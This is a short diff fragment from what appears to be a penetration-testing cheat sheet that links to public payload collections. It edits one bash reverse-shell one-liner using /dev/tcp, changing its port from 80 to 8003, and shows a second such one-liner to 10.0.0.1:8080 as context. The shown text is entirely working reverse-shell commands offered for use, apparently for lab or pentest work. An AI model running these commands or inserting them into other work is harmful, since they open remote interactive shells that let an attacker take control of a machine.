@@ -6,7 +6,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 https://www.revshells.com/
 ##### Bash
 ```
-bash -c "bash -i >& /dev/tcp/192.168.45.201/80 0>&1"
+bash -c "bash -i >& /dev/tcp/192.168.45.201/8003 0>&1"
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
